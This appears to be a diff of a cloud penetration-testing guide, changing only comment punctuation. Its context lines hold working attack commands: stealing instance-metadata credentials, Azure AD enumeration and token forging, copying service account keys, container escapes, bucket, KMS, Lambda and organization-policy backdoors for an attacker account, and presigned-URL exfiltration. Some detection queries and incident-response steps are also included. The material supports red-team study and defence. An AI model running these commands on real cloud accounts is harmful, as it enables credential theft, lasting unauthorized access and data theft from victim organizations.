@@ -342,13 +342,13 @@ aws lambda invoke --function-name TARGET /tmp/out.json
 ### SSRF to IMDSv1 and IMDSv2 Enforcement
 
 ```bash
-# IMDSv1 — no token required (legacy, dangerous)
+# IMDSv1: no token required (legacy, dangerous)
 curl http://169.254.169.254/latest/meta-data/
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # Get role name then retrieve temporary credentials:
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
 
-# IMDSv2 — requires PUT request to get session token first
+# IMDSv2: requires PUT request to get session token first
 TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 curl -H "X-aws-ec2-metadata-token: $TOKEN" \
@@ -441,16 +441,16 @@ aws ssm create-document \
 ### Azure AD / Entra ID Enumeration
 
 ```powershell
-# ROADtools — comprehensive Azure AD enumeration
+# ROADtools: comprehensive Azure AD enumeration
 pip install roadtools
 roadrecon gather -u user@domain.com -p Password123
 roadrecon gui  # Web interface to browse results
 
-# AzureHound — BloodHound for Azure
+# AzureHound: BloodHound for Azure
 ./azurehound -u user@domain.com -p Password123 list --tenant TENANT_ID -o azurehound_output.json
 # Import into BloodHound for attack path visualization
 
-# AADInternals — deep Azure AD manipulation
+# AADInternals: deep Azure AD manipulation
 Import-Module AADInternals
 
 # Enumerate tenant information (no auth required)
@@ -464,7 +464,7 @@ Get-AADIntGroups -AccessToken $token
 Get-AADIntServicePrincipals -AccessToken $token
 Get-AADIntApplications -AccessToken $token
 
-# GraphRunner — Microsoft Graph enumeration
+# GraphRunner: Microsoft Graph enumeration
 Import-Module GraphRunner
 Invoke-GraphRecon -Tokens $tokens -PermissionEnum
 Invoke-DumpApps -Tokens $tokens
@@ -507,7 +507,7 @@ $PRT = New-AADIntUserPRTToken -Settings $prtKeys
 $token = Get-AADIntAccessTokenWithPRT -PRTToken $PRT `
   -Resource "https://management.azure.com/" -ClientId "1b730954-..."
 
-# Token replay — inject stolen token into browser
+# Token replay: inject stolen token into browser
 # Chrome SSO cookies for office.com, portal.azure.com
 ```
 
@@ -644,7 +644,7 @@ gcloud organizations get-iam-policy ORG_ID
 gcloud iam list-grantable-roles //cloudresourcemanager.googleapis.com/projects/PROJECT_ID
 
 # Test permissions without actually calling them (audit logs still generated)
-# Uses iam.testIamPermissions — check if you have specific permissions
+# Uses iam.testIamPermissions: check if you have specific permissions
 gcloud projects test-iam-permissions PROJECT_ID \
   --permissions "iam.serviceAccounts.actAs,compute.instances.create,storage.buckets.list"
 
@@ -659,7 +659,7 @@ gcloud iam service-accounts keys list --iam-account=SA_EMAIL
 ### Service Account Key Theft
 
 ```bash
-# From GCS buckets — common mistake: storing JSON key files in accessible buckets
+# From GCS buckets: common mistake: storing JSON key files in accessible buckets
 gsutil ls gs://TARGET_BUCKET/
 gsutil cp gs://TARGET_BUCKET/service-account-key.json .
 
@@ -869,12 +869,12 @@ docker -H unix:///var/run/docker.sock run \
 Dangerous Capabilities
 
 ```bash
-# CAP_SYS_ADMIN — most dangerous, many escape paths
+# CAP_SYS_ADMIN: most dangerous, many escape paths
 # Mount host filesystem:
 mkdir /mnt/cgroup && mount -t cgroup -o memory cgroup /mnt/cgroup
 # Or use overlay/fuse mounts to access host
 
-# CAP_NET_ADMIN — network manipulation
+# CAP_NET_ADMIN: network manipulation
 # Set up network tap to intercept cluster traffic
 ip link add dummy0 type dummy
 tcpdump -i any -w /tmp/capture.pcap
@@ -1028,7 +1028,7 @@ aws lambda get-function-configuration --function-name TARGET_FUNCTION \
 
 # Download and inspect function code
 aws lambda get-function --function-name TARGET_FUNCTION --query 'Code.Location' --output text
-# Returns presigned S3 URL — download and unzip for code review
+# Returns presigned S3 URL: download and unzip for code review
 
 # Overprivileged execution role exploitation
 # Lambda running as role with broad permissions
@@ -1079,7 +1079,7 @@ aws cognito-idp sign-up \
 ### API Gateway Bypass
 
 ```bash
-# Resource policy misconfiguration — check if API is publicly accessible
+# Resource policy misconfiguration: check if API is publicly accessible
 # without proper authorization
 curl https://API_ID.execute-api.REGION.amazonaws.com/prod/admin
 
@@ -1187,7 +1187,7 @@ CREDS_C=$(aws sts assume-role \
 ### Resource-Based Policy Backdoors
 
 ```bash
-# S3 bucket policy backdoor — grant attacker external account access
+# S3 bucket policy backdoor: grant attacker external account access
 aws s3api put-bucket-policy --bucket VICTIM_BUCKET --policy '{
   "Statement": [{
     "Effect": "Allow",
@@ -1197,7 +1197,7 @@ aws s3api put-bucket-policy --bucket VICTIM_BUCKET --policy '{
   }]
 }'
 
-# KMS key policy backdoor — allow attacker account to use encryption key
+# KMS key policy backdoor: allow attacker account to use encryption key
 aws kms put-key-policy \
   --key-id KEY_ID \
   --policy-name default \
@@ -1210,14 +1210,14 @@ aws kms put-key-policy \
     }]
   }'
 
-# Lambda resource policy — allow attacker account to invoke Lambda
+# Lambda resource policy: allow attacker account to invoke Lambda
 aws lambda add-permission \
   --function-name TARGET_FUNCTION \
   --statement-id backdoor \
   --action lambda:InvokeFunction \
   --principal ATTACKER_ACCOUNT_ID
 
-# ECR repository policy — allow attacker to pull/push container images
+# ECR repository policy: allow attacker to pull/push container images
 aws ecr set-repository-policy \
   --repository-name TARGET_REPO \
   --policy-text '{
@@ -1244,7 +1244,7 @@ aws secretsmanager put-resource-policy \
 ### Organization-Level Persistence
 
 ```bash
-# SCP modification — remove restrictions on attacker account
+# SCP modification: remove restrictions on attacker account
 aws organizations update-policy \
   --policy-id POLICY_ID \
   --content '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
@@ -1254,7 +1254,7 @@ aws organizations register-delegated-administrator \
   --account-id ATTACKER_ACCOUNT \
   --service-principal securityhub.amazonaws.com
 
-# CloudFormation StackSet abuse — deploy resources to all member accounts
+# CloudFormation StackSet abuse: deploy resources to all member accounts
 aws cloudformation create-stack-set \
   --stack-set-name AWSConfig-ServiceRole \  # Benign-looking name
   --template-body file://backdoor-template.json \
@@ -1298,7 +1298,7 @@ aws ssm create-association \
 CloudTrail Events to Correlate for Persistence Detection
 
 ```kql
-// Splunk query — detect IAM backdoor sequence
+// Splunk query: detect IAM backdoor sequence
 index=cloudtrail eventName IN (CreateUser, CreateLoginProfile, CreateAccessKey, 
   AttachUserPolicy, PutUserPolicy, AddUserToGroup, UpdateAssumeRolePolicy)
 | stats count values(eventName) as events 
@@ -1307,7 +1307,7 @@ index=cloudtrail eventName IN (CreateUser, CreateLoginProfile, CreateAccessKey,
 | where count >= 2
 | sort -count
 
-// CloudTrail Lake query — unusual resource policy modifications
+// CloudTrail Lake query: unusual resource policy modifications
 SELECT eventTime, eventName, userIdentity.arn, requestParameters, sourceIPAddress
 FROM DATASTORE_ID
 WHERE eventName IN ('PutBucketPolicy', 'PutKeyPolicy', 'AddPermission', 
@@ -1348,7 +1348,7 @@ aws s3api put-bucket-replication \
 # Technique 3: Presigned URL generation (exfil without AWS credentials)
 # Generate presigned URL valid for 7 days
 aws s3 presign s3://victim-bucket/sensitive-file.csv --expires-in 604800
-# Share URL — anyone with it can download without authentication
+# Share URL: anyone with it can download without authentication
 
 # Technique 4: S3 Access Points to bypass bucket policies
 aws s3control create-access-point \
@@ -1528,7 +1528,7 @@ curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-
 
 # SSRF bypass attempts: metadata.google.internal alternative
 # metadata.google.internal resolves to 169.254.169.254 within GCP
-# Some apps allow internal DNS names — try metadata.google.internal vs IP
+# Some apps allow internal DNS names: try metadata.google.internal vs IP
 ```
 
 Azure IMDS
@@ -1557,7 +1557,7 @@ Cross-service resource access where a service (the "deputy") acts on behalf of a
 # Attacker tricks CF into using admin role to create attacker resources
 
 # S3 confused deputy: CloudTrail to S3 bucket policy
-# CloudTrail writes to S3 — if bucket policy grants cloudtrail.amazonaws.com 
+# CloudTrail writes to S3: if bucket policy grants cloudtrail.amazonaws.com 
 # without source account condition, attacker can write to victim bucket
 # Mitigation: Use aws:SourceAccount condition in resource policies
 
@@ -1608,7 +1608,7 @@ def find_sensitive(obj, path=''):
 find_sensitive(state)
 "
 
-# Pulumi state backend attacks — similar issue
+# Pulumi state backend attacks: similar issue
 # pulumi stack export --show-secrets
 # Exports all stack state including secret values
 
@@ -1636,7 +1636,7 @@ print('Payload:', json.dumps(payload, indent=2))
 # Azure AD token claims analysis
 # aud (audience), oid (object ID), roles, scp (scopes), tid (tenant)
 
-# GCP service account token — short-lived (1 hour), signed by Google
+# GCP service account token: short-lived (1 hour), signed by Google
 # Cannot be modified but can be replayed if stolen before expiry
 
 # OAuth token scope escalation
@@ -1656,10 +1656,10 @@ print('Payload:', json.dumps(payload, indent=2))
 # If Lambda has direct RDS access with admin credentials
 # Standard SQL injection applies to the underlying database
 
-# AWS Glue data catalog — similar injection surface
+# AWS Glue data catalog: similar injection surface
 # If Glue ETL job constructs queries from parameters
 
-# Redshift Spectrum — query S3 data lakes
+# Redshift Spectrum: query S3 data lakes
 # Injection in external table definitions
 ```
 
@@ -1858,7 +1858,7 @@ aws iam create-access-key --user-name REPLACEMENT_USER
 Phase 2: Preserve Evidence
 
 ```bash
-# Preserve CloudTrail logs — copy to isolated forensics account S3
+# Preserve CloudTrail logs: copy to isolated forensics account S3
 aws s3 sync s3://cloudtrail-logs-bucket/ s3://forensics-bucket/incident-2024-01-01/ \
   --source-region us-east-1 \
   --sse aws:kms \
